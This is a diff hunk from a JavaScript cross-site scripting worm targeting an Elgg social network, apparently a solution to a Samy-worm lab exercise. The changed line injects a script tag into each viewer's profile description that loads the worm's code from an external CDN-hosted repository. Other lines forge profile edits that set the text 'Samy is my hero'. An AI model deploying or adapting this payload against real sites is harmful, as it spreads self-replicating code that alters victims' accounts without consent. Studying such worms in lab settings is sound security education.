@@ -12,7 +12,7 @@ window.onload = function(){
   var content = token + ts + userName 
                 + "&briefdescription=Samy is my hero"  /// leave a note that worm was here
                 + "&accesslevel[briefdescription]=2" 
-                + "&description=<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/losmi247/worm@main/worm.js"></script>"
+                + "&description=<script type='text/javascript' src='https://cdn.jsdelivr.net/gh/losmi247/worm@main/worm.js'></script>"
                 + "&accesslevel[description]=2" + guid;
   var samyGuid = 59;          
   if(elgg.session.user.guid != samyGuid) { // don't overwrite Samy's own 'About Me'
